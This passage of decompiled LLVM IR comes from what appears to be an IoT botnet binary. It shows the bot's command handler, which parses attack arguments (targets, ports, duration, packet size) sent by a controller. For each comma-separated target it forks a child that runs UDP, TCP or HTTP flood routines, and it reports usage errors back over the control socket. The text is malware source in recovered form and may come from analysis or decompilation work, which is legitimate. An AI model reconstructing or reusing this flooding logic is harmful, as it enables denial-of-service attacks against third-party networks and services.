dec_label_pc_10008bb4:                            ; preds = %dec_label_pc_10008b50
  %v2_10008bb8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001bff8.745 to i32), i32* @r4, align 4
  %v3_10008bc8 = inttoptr i32 %v2_10008bb8 to i8*
  %v4_10008bc8 = call i32 @__GI_strcoll(i8* %v3_10008bc8, i32 ptrtoint ([4 x i8]* @global_var_1001bff8.745 to i32))
  %v3_10008bd0 = icmp eq i32 %v4_10008bc8, 0
  br i1 %v3_10008bd0, label %dec_label_pc_10008bd8, label %dec_label_pc_10008f3c

dec_label_pc_10008bd8:                            ; preds = %dec_label_pc_10008bb4
  %tmp98 = icmp slt i32 %arg1, 6
  br i1 %tmp98, label %dec_label_pc_10008d0c, label %dec_label_pc_10008be4

dec_label_pc_10008be4:                            ; preds = %dec_label_pc_10008bd8
  %v1_10008be8 = add i32 %tmp, 12
  %v1_10008bec = inttoptr i32 %v1_10008be8 to i32*
  %v2_10008bec = load i32, i32* %v1_10008bec, align 4
  store i32 268471288, i32* @lr, align 4
  %v2_10008bf4 = call i32 @atol(i32 %v2_10008bec, i32 %v1_10008be8)
  %v4_10008c00 = icmp eq i32 %v2_10008bf4, -1
  br i1 %v4_10008c00, label %dec_label_pc_10008d0c, label %dec_label_pc_10008c08

dec_label_pc_10008c08:                            ; preds = %dec_label_pc_10008be4
  %v1_10008c0c = add i32 %tmp, 8
  %v1_10008c10 = inttoptr i32 %v1_10008c0c to i32*
  %v2_10008c10 = load i32, i32* %v1_10008c10, align 4
  store i32 268471324, i32* @lr, align 4
  %v2_10008c18 = call i32 @atol(i32 %v2_10008c10, i32 %v1_10008c0c)
  %v4_10008c24 = icmp eq i32 %v2_10008c18, -1
  br i1 %v4_10008c24, label %dec_label_pc_10008d0c, label %dec_label_pc_10008c2c

dec_label_pc_10008c2c:                            ; preds = %dec_label_pc_10008c08
  %v1_10008c30 = add i32 %tmp, 16
  %v1_10008c34 = inttoptr i32 %v1_10008c30 to i32*
  %v2_10008c34 = load i32, i32* %v1_10008c34, align 4
  store i32 268471360, i32* @lr, align 4
  %v2_10008c3c = call i32 @atol(i32 %v2_10008c34, i32 %v1_10008c30)
  %v4_10008c48 = icmp eq i32 %v2_10008c3c, -1
  br i1 %v4_10008c48, label %dec_label_pc_10008d0c, label %dec_label_pc_10008c50

dec_label_pc_10008c50:                            ; preds = %dec_label_pc_10008c2c
  %v1_10008c54 = add i32 %tmp, 20
  %v1_10008c58 = inttoptr i32 %v1_10008c54 to i32*
  %v2_10008c58 = load i32, i32* %v1_10008c58, align 4
  store i32 268471396, i32* @lr, align 4
  %v2_10008c60 = call i32 @atol(i32 %v2_10008c58, i32 %v1_10008c54)
  %v4_10008c6c = icmp eq i32 %v2_10008c60, -1
  br i1 %v4_10008c6c, label %dec_label_pc_10008d0c, label %dec_label_pc_10008c74

dec_label_pc_10008c74:                            ; preds = %dec_label_pc_10008c50
  %v2_10008c7c = load i32, i32* %v1_10008c58, align 4
  store i32 268471432, i32* @lr, align 4
  %v2_10008c84 = call i32 @atol(i32 %v2_10008c7c, i32 %v1_10008c54)
  %v3_10008c90 = icmp sgt i32 %v2_10008c84, 65536
  br i1 %v3_10008c90, label %dec_label_pc_10008d0c, label %dec_label_pc_10008c98

dec_label_pc_10008c98:                            ; preds = %dec_label_pc_10008c74
  %v2_10008ca0 = load i32, i32* %v1_10008c58, align 4
  store i32 268471468, i32* @lr, align 4
  %v2_10008ca8 = call i32 @atol(i32 %v2_10008ca0, i32 %v1_10008c54)
  %v3_10008cb8 = icmp sgt i32 %v2_10008ca8, 65500
  br i1 %v3_10008cb8, label %dec_label_pc_10008d0c, label %dec_label_pc_10008cc0

dec_label_pc_10008cc0:                            ; preds = %dec_label_pc_10008c98
  %v2_10008cc8 = load i32, i32* %v1_10008c34, align 4
  store i32 268471508, i32* @lr, align 4
  %v2_10008cd0 = call i32 @atol(i32 %v2_10008cc8, i32 %v1_10008c30)
  %v2_10008cd8 = icmp sgt i32 %v2_10008cd0, 32
  br i1 %v2_10008cd8, label %dec_label_pc_10008d0c, label %dec_label_pc_10008ce0

dec_label_pc_10008ce0:                            ; preds = %dec_label_pc_10008cc0
  %v1_10008ce4 = icmp slt i32 %arg1, 7
  %v3_10008ce4 = icmp eq i32 %arg1, 7
  br i1 %v3_10008ce4, label %dec_label_pc_10008cec, label %dec_label_pc_10008d2c

dec_label_pc_10008cec:                            ; preds = %dec_label_pc_10008ce0
  %v1_10008cf0 = add i32 %tmp, 24
  %v1_10008cf4 = inttoptr i32 %v1_10008cf0 to i32*
  %v2_10008cf4 = load i32, i32* %v1_10008cf4, align 4
  store i32 268471552, i32* @lr, align 4
  %v2_10008cfc = call i32 @atol(i32 %v2_10008cf4, i32 %v1_10008cf0)
  %v2_10008d04 = icmp sgt i32 %v2_10008cfc, 0
  br i1 %v2_10008d04, label %dec_label_pc_10008d2c, label %dec_label_pc_10008d0c

dec_label_pc_10008d0c:                            ; preds = %dec_label_pc_10008cec, %dec_label_pc_10008cc0, %dec_label_pc_10008c98, %dec_label_pc_10008c74, %dec_label_pc_10008c50, %dec_label_pc_10008c2c, %dec_label_pc_10008c08, %dec_label_pc_10008be4, %dec_label_pc_10008bd8
  %v3_10008d10 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_10008d28.747 to i32), i32* @lr, align 4
  %v4_10008d24 = call i32 @sockprintf(i32 %v3_10008d10, i32 ptrtoint ([113 x i8]* @global_var_1001bffc.746 to i32), i32 268566528)
  br label %dec_label_pc_100098fc

dec_label_pc_10008d2c:                            ; preds = %dec_label_pc_10008ce0, %dec_label_pc_10008cec
  %v1_10008d30 = add i32 %tmp, 4
  %v1_10008d34 = inttoptr i32 %v1_10008d30 to i32*
  %v2_10008d34 = load i32, i32* %v1_10008d34, align 4
  %v2_10008d44 = load i32, i32* %v1_10008c10, align 4
  store i32 268471632, i32* @lr, align 4
  %v2_10008d4c = call i32 @atol(i32 %v2_10008d44, i32 %v1_10008c0c)
  %v2_10008d60 = load i32, i32* %v1_10008bec, align 4
  store i32 268471660, i32* @lr, align 4
  %v2_10008d68 = call i32 @atol(i32 %v2_10008d60, i32 %v1_10008be8)
  %v2_10008d7c = load i32, i32* %v1_10008c34, align 4
  store i32 268471688, i32* @lr, align 4
  %v2_10008d84 = call i32 @atol(i32 %v2_10008d7c, i32 %v1_10008c30)
  %v2_10008d98 = load i32, i32* %v1_10008c58, align 4
  store i32 268471716, i32* @lr, align 4
  %v2_10008da0 = call i32 @atol(i32 %v2_10008d98, i32 %v1_10008c54)
  br i1 %v1_10008ce4, label %dec_label_pc_10008ddc.thread, label %dec_label_pc_10008ddc

dec_label_pc_10008ddc.thread:                     ; preds = %dec_label_pc_10008d2c
  br label %dec_label_pc_10008e0c

dec_label_pc_10008ddc:                            ; preds = %dec_label_pc_10008d2c
  %v1_10008dbc = add i32 %tmp, 24
  %v1_10008dc0 = inttoptr i32 %v1_10008dbc to i32*
  %v2_10008dc0 = load i32, i32* %v1_10008dc0, align 4
  store i32 268471756, i32* @lr, align 4
  %v2_10008dc8 = call i32 @atol(i32 %v2_10008dc0, i32 %v1_10008dbc)
  br i1 %v3_10008ce4, label %dec_label_pc_10008e0c, label %dec_label_pc_10008df0

dec_label_pc_10008df0:                            ; preds = %dec_label_pc_10008ddc
  %v1_10008df4 = add i32 %tmp, 28
  %v1_10008df8 = inttoptr i32 %v1_10008df4 to i32*
  %v2_10008df8 = load i32, i32* %v1_10008df8, align 4
  store i32 268471812, i32* @lr, align 4
  %v2_10008e00 = call i32 @atol(i32 %v2_10008df8, i32 %v1_10008df4)
  br label %dec_label_pc_10008e20

dec_label_pc_10008e0c:                            ; preds = %dec_label_pc_10008ddc.thread, %dec_label_pc_10008ddc
  %storemerge1023 = phi i32 [ 1000, %dec_label_pc_10008ddc.thread ], [ %v2_10008dc8, %dec_label_pc_10008ddc ]
  br label %dec_label_pc_10008e20

dec_label_pc_10008e20:                            ; preds = %dec_label_pc_10008df0, %dec_label_pc_10008e0c
  %storemerge1022 = phi i32 [ %storemerge1023, %dec_label_pc_10008e0c ], [ %v2_10008dc8, %dec_label_pc_10008df0 ]
  %storemerge9 = phi i32 [ 1000000, %dec_label_pc_10008e0c ], [ %v2_10008e00, %dec_label_pc_10008df0 ]
  %tmp100 = icmp slt i32 %arg1, 9
  br i1 %tmp100, label %dec_label_pc_10008e50, label %dec_label_pc_10008e34

dec_label_pc_10008e34:                            ; preds = %dec_label_pc_10008e20
  %v1_10008e38 = add i32 %tmp, 32
  %v1_10008e3c = inttoptr i32 %v1_10008e38 to i32*
  %v2_10008e3c = load i32, i32* %v1_10008e3c, align 4
  store i32 268471880, i32* @lr, align 4
  %v2_10008e44 = call i32 @atol(i32 %v2_10008e3c, i32 %v1_10008e38)
  br label %dec_label_pc_10008e58

dec_label_pc_10008e50:                            ; preds = %dec_label_pc_10008e20
  br label %dec_label_pc_10008e58

dec_label_pc_10008e58:                            ; preds = %dec_label_pc_10008e34, %dec_label_pc_10008e50
  %storemerge8 = phi i32 [ 0, %dec_label_pc_10008e50 ], [ %v2_10008e44, %dec_label_pc_10008e34 ]
  store i32 %v2_10008d34, i32* @r3, align 4
  store i32 268471920, i32* @lr, align 4
  %v2_10008e6c = call i32 @__GI_strchr(i32 %v2_10008d34, i32 44)
  %v3_10008e74 = icmp eq i32 %v2_10008e6c, 0
  br i1 %v3_10008e74, label %dec_label_pc_10008f00, label %dec_label_pc_10008e7c

dec_label_pc_10008e7c:                            ; preds = %dec_label_pc_10008e58
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268471952, i32* @lr, align 4
  %v3_10008e8c = call i32 @__GI_strtok(i32 %v2_10008d34, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_10008ef441 = icmp eq i32 %v3_10008e8c, 0
  br i1 %v3_10008ef441, label %dec_label_pc_100098fc, label %dec_label_pc_10008e9c

dec_label_pc_10008e9c:                            ; preds = %dec_label_pc_10008e7c, %dec_label_pc_10008ed8
  %storemerge2142 = phi i32 [ %v3_10008ee4, %dec_label_pc_10008ed8 ], [ %v3_10008e8c, %dec_label_pc_10008e7c ]
  store i32 268471968, i32* @lr, align 4
  %v0_10008e9c = call i32 @listFork()
  %v3_10008ea4 = icmp eq i32 %v0_10008e9c, 0
  br i1 %v3_10008ea4, label %dec_label_pc_10008eac, label %dec_label_pc_10008ed8

dec_label_pc_10008eac:                            ; preds = %dec_label_pc_10008e9c
  store i32 %storemerge8, i32* @r10, align 4
  %v7_10008ecc = call i32 @sendUDP(i32 %storemerge2142, i32 %v2_10008d4c, i32 %v2_10008d68, i32 %v2_10008d84, i32 %v2_10008da0, i32 %storemerge1022, i32 %storemerge9)
  %v1_10008ed4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10008ed8

dec_label_pc_10008ed8:                            ; preds = %dec_label_pc_10008e9c, %dec_label_pc_10008eac
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268472040, i32* @lr, align 4
  %v3_10008ee4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_10008ef4 = icmp eq i32 %v3_10008ee4, 0
  br i1 %v3_10008ef4, label %dec_label_pc_100098fc, label %dec_label_pc_10008e9c

dec_label_pc_10008f00:                            ; preds = %dec_label_pc_10008e58
  store i32 268472068, i32* @lr, align 4
  %v0_10008f00 = call i32 @listFork()
  %v3_10008f08 = icmp eq i32 %v0_10008f00, 0
  br i1 %v3_10008f08, label %dec_label_pc_10008f10, label %dec_label_pc_100098fc

dec_label_pc_10008f10:                            ; preds = %dec_label_pc_10008f00
  store i32 %storemerge8, i32* @r10, align 4
  %v7_10008f30 = call i32 @sendUDP(i32 %v2_10008d34, i32 %v2_10008d4c, i32 %v2_10008d68, i32 %v2_10008d84, i32 %v2_10008da0, i32 %storemerge1022, i32 %storemerge9)
  %v1_10008f38 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10008f3c

dec_label_pc_10008f3c:                            ; preds = %dec_label_pc_10008bb4, %dec_label_pc_10008f10
  %v2_10008f40 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001c070.751 to i32), i32* @r4, align 4
  %v3_10008f50 = inttoptr i32 %v2_10008f40 to i8*
  %v4_10008f50 = call i32 @__GI_strcoll(i8* %v3_10008f50, i32 ptrtoint ([4 x i8]* @global_var_1001c070.751 to i32))
  %v3_10008f58 = icmp eq i32 %v4_10008f50, 0
  br i1 %v3_10008f58, label %dec_label_pc_10008f60, label %dec_label_pc_10009228

dec_label_pc_10008f60:                            ; preds = %dec_label_pc_10008f3c
  %tmp101 = icmp slt i32 %arg1, 6
  br i1 %tmp101, label %dec_label_pc_10009050, label %dec_label_pc_10008f6c

dec_label_pc_10008f6c:                            ; preds = %dec_label_pc_10008f60
  %v1_10008f70 = add i32 %tmp, 12
  %v1_10008f74 = inttoptr i32 %v1_10008f70 to i32*
  %v2_10008f74 = load i32, i32* %v1_10008f74, align 4
  store i32 268472192, i32* @lr, align 4
  %v2_10008f7c = call i32 @atol(i32 %v2_10008f74, i32 %v1_10008f70)
  %v4_10008f88 = icmp eq i32 %v2_10008f7c, -1
  br i1 %v4_10008f88, label %dec_label_pc_10009050, label %dec_label_pc_10008f90

dec_label_pc_10008f90:                            ; preds = %dec_label_pc_10008f6c
  %v1_10008f94 = add i32 %tmp, 8
  %v1_10008f98 = inttoptr i32 %v1_10008f94 to i32*
  %v2_10008f98 = load i32, i32* %v1_10008f98, align 4
  store i32 268472228, i32* @lr, align 4
  %v2_10008fa0 = call i32 @atol(i32 %v2_10008f98, i32 %v1_10008f94)
  %v4_10008fac = icmp eq i32 %v2_10008fa0, -1
  br i1 %v4_10008fac, label %dec_label_pc_10009050, label %dec_label_pc_10008fb4

dec_label_pc_10008fb4:                            ; preds = %dec_label_pc_10008f90
  %v1_10008fb8 = add i32 %tmp, 16
  %v1_10008fbc = inttoptr i32 %v1_10008fb8 to i32*
  %v2_10008fbc = load i32, i32* %v1_10008fbc, align 4
  store i32 268472264, i32* @lr, align 4
  %v2_10008fc4 = call i32 @atol(i32 %v2_10008fbc, i32 %v1_10008fb8)
  %v4_10008fd0 = icmp eq i32 %v2_10008fc4, -1
  br i1 %v4_10008fd0, label %dec_label_pc_10009050, label %dec_label_pc_10008fd8

dec_label_pc_10008fd8:                            ; preds = %dec_label_pc_10008fb4
  %v2_10008fe0 = load i32, i32* %v1_10008fbc, align 4
  store i32 268472300, i32* @lr, align 4
  %v2_10008fe8 = call i32 @atol(i32 %v2_10008fe0, i32 %v1_10008fb8)
  %v2_10008ff0 = icmp sgt i32 %v2_10008fe8, 32
  br i1 %v2_10008ff0, label %dec_label_pc_10009050, label %dec_label_pc_10008ff8

dec_label_pc_10008ff8:                            ; preds = %dec_label_pc_10008fd8
  %tmp102 = icmp slt i32 %arg1, 7
  br i1 %tmp102, label %dec_label_pc_10009024, label %dec_label_pc_10009004

dec_label_pc_10009004:                            ; preds = %dec_label_pc_10008ff8
  %v1_10009008 = add i32 %tmp, 24
  %v1_1000900c = inttoptr i32 %v1_10009008 to i32*
  %v2_1000900c = load i32, i32* %v1_1000900c, align 4
  store i32 268472344, i32* @lr, align 4
  %v2_10009014 = call i32 @atol(i32 %v2_1000900c, i32 %v1_10009008)
  %v1_1000901c = icmp slt i32 %v2_10009014, 0
  br i1 %v1_1000901c, label %dec_label_pc_10009050, label %dec_label_pc_10009024

dec_label_pc_10009024:                            ; preds = %dec_label_pc_10009004, %dec_label_pc_10008ff8
  %v3_10009028 = icmp eq i32 %arg1, 8
  br i1 %v3_10009028, label %dec_label_pc_10009030, label %dec_label_pc_10009070

dec_label_pc_10009030:                            ; preds = %dec_label_pc_10009024
  %v1_10009034 = add i32 %tmp, 28
  %v1_10009038 = inttoptr i32 %v1_10009034 to i32*
  %v2_10009038 = load i32, i32* %v1_10009038, align 4
  store i32 268472388, i32* @lr, align 4
  %v2_10009040 = call i32 @atol(i32 %v2_10009038, i32 %v1_10009034)
  %v2_10009048 = icmp sgt i32 %v2_10009040, 0
  br i1 %v2_10009048, label %dec_label_pc_10009070, label %dec_label_pc_10009050

dec_label_pc_10009050:                            ; preds = %dec_label_pc_10009030, %dec_label_pc_10009004, %dec_label_pc_10008fd8, %dec_label_pc_10008fb4, %dec_label_pc_10008f90, %dec_label_pc_10008f6c, %dec_label_pc_10008f60
  %v3_10009054 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_1000906c.753 to i32), i32* @lr, align 4
  %v4_10009068 = call i32 @sockprintf(i32 %v3_10009054, i32 ptrtoint ([186 x i8]* @global_var_1001c074.752 to i32), i32 268566528)
  br label %dec_label_pc_100098fc

dec_label_pc_10009070:                            ; preds = %dec_label_pc_10009024, %dec_label_pc_10009030
  %v1_10009074 = add i32 %tmp, 4
  %v1_10009078 = inttoptr i32 %v1_10009074 to i32*
  %v2_10009078 = load i32, i32* %v1_10009078, align 4
  %v2_10009088 = load i32, i32* %v1_10008f98, align 4
  store i32 268472468, i32* @lr, align 4
  %v2_10009090 = call i32 @atol(i32 %v2_10009088, i32 %v1_10008f94)
  %v2_100090a4 = load i32, i32* %v1_10008f74, align 4
  store i32 268472496, i32* @lr, align 4
  %v2_100090ac = call i32 @atol(i32 %v2_100090a4, i32 %v1_10008f70)
  %v2_100090c0 = load i32, i32* %v1_10008fbc, align 4
  store i32 268472524, i32* @lr, align 4
  %v2_100090c8 = call i32 @atol(i32 %v2_100090c0, i32 %v1_10008fb8)
  %v1_100090d8 = add i32 %tmp, 20
  %v1_100090dc = inttoptr i32 %v1_100090d8 to i32*
  %v2_100090dc = load i32, i32* %v1_100090dc, align 4
  br i1 %v3_10009028, label %dec_label_pc_100090f0, label %dec_label_pc_1000910c

dec_label_pc_100090f0:                            ; preds = %dec_label_pc_10009070
  %v1_100090f4 = add i32 %tmp, 28
  %v1_100090f8 = inttoptr i32 %v1_100090f4 to i32*
  %v2_100090f8 = load i32, i32* %v1_100090f8, align 4
  store i32 268472580, i32* @lr, align 4
  %v2_10009100 = call i32 @atol(i32 %v2_100090f8, i32 %v1_100090f4)
  br label %dec_label_pc_10009114

dec_label_pc_1000910c:                            ; preds = %dec_label_pc_10009070
  br label %dec_label_pc_10009114

dec_label_pc_10009114:                            ; preds = %dec_label_pc_100090f0, %dec_label_pc_1000910c
  %storemerge7 = phi i32 [ 10, %dec_label_pc_1000910c ], [ %v2_10009100, %dec_label_pc_100090f0 ]
  br i1 %tmp102, label %dec_label_pc_10009144, label %dec_label_pc_10009128

dec_label_pc_10009128:                            ; preds = %dec_label_pc_10009114
  %v1_1000912c = add i32 %tmp, 24
  %v1_10009130 = inttoptr i32 %v1_1000912c to i32*
  %v2_10009130 = load i32, i32* %v1_10009130, align 4
  store i32 268472636, i32* @lr, align 4
  %v2_10009138 = call i32 @atol(i32 %v2_10009130, i32 %v1_1000912c)
  br label %dec_label_pc_1000914c

dec_label_pc_10009144:                            ; preds = %dec_label_pc_10009114
  br label %dec_label_pc_1000914c

dec_label_pc_1000914c:                            ; preds = %dec_label_pc_10009128, %dec_label_pc_10009144
  %storemerge6 = phi i32 [ 0, %dec_label_pc_10009144 ], [ %v2_10009138, %dec_label_pc_10009128 ]
  store i32 %v2_10009078, i32* @r3, align 4
  store i32 268472676, i32* @lr, align 4
  %v2_10009160 = call i32 @__GI_strchr(i32 %v2_10009078, i32 44)
  %v3_10009168 = icmp eq i32 %v2_10009160, 0
  br i1 %v3_10009168, label %dec_label_pc_100091f0, label %dec_label_pc_10009170

dec_label_pc_10009170:                            ; preds = %dec_label_pc_1000914c
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268472708, i32* @lr, align 4
  %v3_10009180 = call i32 @__GI_strtok(i32 %v2_10009078, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_100091e437 = icmp eq i32 %v3_10009180, 0
  br i1 %v3_100091e437, label %dec_label_pc_10009228, label %dec_label_pc_10009190

dec_label_pc_10009190:                            ; preds = %dec_label_pc_10009170, %dec_label_pc_100091c8
  %storemerge1938 = phi i32 [ %v3_100091d4, %dec_label_pc_100091c8 ], [ %v3_10009180, %dec_label_pc_10009170 ]
  store i32 268472724, i32* @lr, align 4
  %v0_10009190 = call i32 @listFork()
  %v3_10009198 = icmp eq i32 %v0_10009190, 0
  br i1 %v3_10009198, label %dec_label_pc_100091a0, label %dec_label_pc_100091c8

dec_label_pc_100091a0:                            ; preds = %dec_label_pc_10009190
  %v7_100091bc = call i32 @sendTCP(i32 %storemerge1938, i32 %v2_10009090, i32 %v2_100090ac, i32 %v2_100090c8, i32 %v2_100090dc, i32 %storemerge6, i32 %storemerge7)
  %v1_100091c4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100091c8

dec_label_pc_100091c8:                            ; preds = %dec_label_pc_10009190, %dec_label_pc_100091a0
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268472792, i32* @lr, align 4
  %v3_100091d4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_100091e4 = icmp eq i32 %v3_100091d4, 0
  br i1 %v3_100091e4, label %dec_label_pc_10009228, label %dec_label_pc_10009190

dec_label_pc_100091f0:                            ; preds = %dec_label_pc_1000914c
  store i32 268472820, i32* @lr, align 4
  %v0_100091f0 = call i32 @listFork()
  %v3_100091f8 = icmp eq i32 %v0_100091f0, 0
  br i1 %v3_100091f8, label %dec_label_pc_10009200, label %dec_label_pc_10009228

dec_label_pc_10009200:                            ; preds = %dec_label_pc_100091f0
  %v7_1000921c = call i32 @sendTCP(i32 %v2_10009078, i32 %v2_10009090, i32 %v2_100090ac, i32 %v2_100090c8, i32 %v2_100090dc, i32 %storemerge6, i32 %storemerge7)
  %v1_10009224 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10009228

dec_label_pc_10009228:                            ; preds = %dec_label_pc_100091c8, %dec_label_pc_10009170, %dec_label_pc_100091f0, %dec_label_pc_10008f3c, %dec_label_pc_10009200
  %v2_1000922c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1001c130.757 to i32), i32* @r4, align 4
  %v3_1000923c = inttoptr i32 %v2_1000922c to i8*
  %v4_1000923c = call i32 @__GI_strcoll(i8* %v3_1000923c, i32 ptrtoint ([5 x i8]* @global_var_1001c130.757 to i32))
  %v3_10009244 = icmp eq i32 %v4_1000923c, 0
  br i1 %v3_10009244, label %dec_label_pc_1000924c, label %dec_label_pc_1000942c

dec_label_pc_1000924c:                            ; preds = %dec_label_pc_10009228
  %tmp103 = icmp slt i32 %arg1, 6
  br i1 %tmp103, label %dec_label_pc_100098fc, label %dec_label_pc_10009258

dec_label_pc_10009258:                            ; preds = %dec_label_pc_1000924c
  %v1_1000925c = add i32 %tmp, 4
  %v1_10009260 = inttoptr i32 %v1_1000925c to i32*
  %v2_10009260 = load i32, i32* %v1_10009260, align 4
  store i32 %v2_10009260, i32* @r3, align 4
  store i32 268472944, i32* @lr, align 4
  %v2_1000926c = call i32 @__GI_strchr(i32 %v2_10009260, i32 44)
  %v3_10009274 = icmp eq i32 %v2_1000926c, 0
  br i1 %v3_10009274, label %dec_label_pc_1000937c, label %dec_label_pc_1000927c

dec_label_pc_1000927c:                            ; preds = %dec_label_pc_10009258
  %v2_10009284 = load i32, i32* %v1_10009260, align 4
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268472984, i32* @lr, align 4
  %v3_10009294 = call i32 @__GI_strtok(i32 %v2_10009284, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_1000937034 = icmp eq i32 %v3_10009294, 0
  br i1 %v3_1000937034, label %dec_label_pc_1000942c, label %dec_label_pc_100092a4.lr.ph

dec_label_pc_100092a4.lr.ph:                      ; preds = %dec_label_pc_1000927c
  %v1_100092d8 = add i32 %tmp, 12
  %v1_100092dc = inttoptr i32 %v1_100092d8 to i32*
  %v1_10009304 = add i32 %tmp, 20
  %v1_10009308 = inttoptr i32 %v1_10009304 to i32*
  %v1_1000931c = add i32 %tmp, 24
  %v1_10009320 = inttoptr i32 %v1_1000931c to i32*
  br label %dec_label_pc_100092a4

dec_label_pc_100092a4:                            ; preds = %dec_label_pc_100092a4.lr.ph, %dec_label_pc_10009354
  store i32 268473000, i32* @lr, align 4
  %v0_100092a4 = call i32 @listFork()
  %v3_100092ac = icmp eq i32 %v0_100092a4, 0
  br i1 %v3_100092ac, label %dec_label_pc_100092b4, label %dec_label_pc_10009354

dec_label_pc_100092b4:                            ; preds = %dec_label_pc_100092a4
  %v2_100092bc = load i32, i32* %v1_10009260, align 4
  store i32 %v2_100092bc, i32* @r29, align 4
  %v2_100092dc = load i32, i32* %v1_100092dc, align 4
  store i32 268473064, i32* @lr, align 4
  %v2_100092e4 = call i32 @atol(i32 %v2_100092dc, i32 %v1_100092d8)
  %v1_100092ec = urem i32 %v2_100092e4, 65536
  store i32 %v1_100092ec, i32* @r27, align 4
  %v2_10009308 = load i32, i32* %v1_10009308, align 4
  store i32 268473108, i32* @lr, align 4
  %v2_10009310 = call i32 @atol(i32 %v2_10009308, i32 %v1_10009304)
  %v2_10009320 = load i32, i32* %v1_10009320, align 4
  store i32 268473132, i32* @lr, align 4
  %v2_10009328 = call i32 @atol(i32 %v2_10009320, i32 %v1_1000931c)
  %v0_10009330 = load i32, i32* @r29, align 4
  %v0_10009334 = load i32, i32* @r28, align 4
  %v0_10009338 = load i32, i32* @r27, align 4
  %v0_1000933c = load i32, i32* @r26, align 4
  %v0_10009340 = load i32, i32* @r25, align 4
  %v6_10009348 = trunc i32 %v0_10009338 to i16
  %v7_10009348 = call i32 @sendHTTP(i32 %v0_10009330, i32 %v0_10009334, i16 %v6_10009348, i32 %v0_1000933c, i32 %v0_10009340, i32 %v2_10009328)
  %v1_10009350 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10009354

dec_label_pc_10009354:                            ; preds = %dec_label_pc_100092a4, %dec_label_pc_100092b4
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268473188, i32* @lr, align 4
  %v3_10009360 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_10009370 = icmp eq i32 %v3_10009360, 0
  br i1 %v3_10009370, label %dec_label_pc_1000942c, label %dec_label_pc_100092a4

dec_label_pc_1000937c:                            ; preds = %dec_label_pc_10009258
  store i32 268473216, i32* @lr, align 4
  %v0_1000937c = call i32 @listFork()
  %v3_10009384 = icmp eq i32 %v0_1000937c, 0
  br i1 %v3_10009384, label %dec_label_pc_1000938c, label %dec_label_pc_100098fc

dec_label_pc_1000938c:                            ; preds = %dec_label_pc_1000937c
  %v2_10009394 = load i32, i32* %v1_10009260, align 4
  store i32 %v2_10009394, i32* @r29, align 4
  %v1_100093b0 = add i32 %tmp, 12
  %v1_100093b4 = inttoptr i32 %v1_100093b0 to i32*
  %v2_100093b4 = load i32, i32* %v1_100093b4, align 4
  store i32 268473280, i32* @lr, align 4
  %v2_100093bc = call i32 @atol(i32 %v2_100093b4, i32 %v1_100093b0)
  %v1_100093c4 = urem i32 %v2_100093bc, 65536
  store i32 %v1_100093c4, i32* @r27, align 4
  %v1_100093dc = add i32 %tmp, 20
  %v1_100093e0 = inttoptr i32 %v1_100093dc to i32*
  %v2_100093e0 = load i32, i32* %v1_100093e0, align 4
  store i32 268473324, i32* @lr, align 4
  %v2_100093e8 = call i32 @atol(i32 %v2_100093e0, i32 %v1_100093dc)
  %v1_100093f4 = add i32 %tmp, 24
  %v1_100093f8 = inttoptr i32 %v1_100093f4 to i32*
  %v2_100093f8 = load i32, i32* %v1_100093f8, align 4
  store i32 268473348, i32* @lr, align 4
  %v2_10009400 = call i32 @atol(i32 %v2_100093f8, i32 %v1_100093f4)
  %v0_10009408 = load i32, i32* @r29, align 4
  %v0_1000940c = load i32, i32* @r28, align 4
  %v0_10009410 = load i32, i32* @r27, align 4
  %v0_10009414 = load i32, i32* @r26, align 4
  %v0_10009418 = load i32, i32* @r25, align 4
  %v6_10009420 = trunc i32 %v0_10009410 to i16
  %v7_10009420 = call i32 @sendHTTP(i32 %v0_10009408, i32 %v0_1000940c, i16 %v6_10009420, i32 %v0_10009414, i32 %v0_10009418, i32 %v2_10009400)
  %v1_10009428 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000942c

dec_label_pc_1000942c:                            ; preds = %dec_label_pc_10009354, %dec_label_pc_1000927c, %dec_label_pc_10009228, %dec_label_pc_1000938c
  %v2_10009430 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001c138.761 to i32), i32* @r4, align 4
  %v3_10009440 = inttoptr i32 %v2_10009430 to i8*
  %v4_10009440 = call i32 @__GI_strcoll(i8* %v3_10009440, i32 ptrtoint ([4 x i8]* @global_var_1001c138.761 to i32))
  %v3_10009448 = icmp eq i32 %v4_10009440, 0
  br i1 %v3_10009448, label %dec_label_pc_10009450, label %dec_label_pc_100095c8

dec_label_pc_10009450:                            ; preds = %dec_label_pc_1000942c
